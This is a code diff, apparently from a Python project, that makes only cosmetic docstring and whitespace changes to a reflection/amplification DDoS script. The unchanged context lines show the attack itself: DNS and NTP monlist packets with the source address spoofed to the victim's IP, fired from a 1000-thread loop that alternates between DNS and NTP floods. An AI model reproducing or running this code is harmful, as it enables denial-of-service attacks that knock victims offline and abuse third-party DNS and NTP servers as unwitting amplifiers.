@@ -15,7 +15,9 @@ import time
 
 
 def dns_ddos(target, dns_server):
-    # List of domain names to send DNS requests for
+    """
+    List of domain names to send DNS requests for
+    """
     dns_hosts = [
         "example.com", "www.example.com", "example.org", "example.be",
         "example.fr", "test.com", "a-very-long-domain-name.com",
@@ -24,7 +26,7 @@ def dns_ddos(target, dns_server):
         "i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof",
         "domain.oof"
     ]
-    
+
     # Send a DNS request for each domain name in the list
     for host in dns_hosts:
         ip = IP(src=target, dst=dns_server)
@@ -36,7 +38,9 @@ def dns_ddos(target, dns_server):
 
 
 def ntp_ddos(target, ntp_server):
-    # Magic Packet aka NTP v2 Monlist Packet
+    """
+    Magic Packet aka NTP v2 Monlist Packet TODO wtf ?
+    """
     data = "\x17\x00\x03\x2a" + "\x00" * 4
     packet = IP(dst=ntp_server, src=target) / \
         UDP(sport=random.randint(2000, 65535), dport=123)/Raw(load=data)
@@ -52,14 +56,14 @@ if __name__ == "__main__":
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
         futures = []
-        for i in range(1000): # alternating between DNS and NTP attacks
+        for i in range(1000):  # alternating between DNS and NTP attacks
             if (i % 2 == 0):
                 futures.append(executor.submit(
                     dns_ddos, target, dns_server))
             else:
                 futures.append(executor.submit(
                     ntp_ddos, target, ntp_server))
-                
+
         # Wait for the tasks to complete
         for future in concurrent.futures.as_completed(futures):
             if future.result():
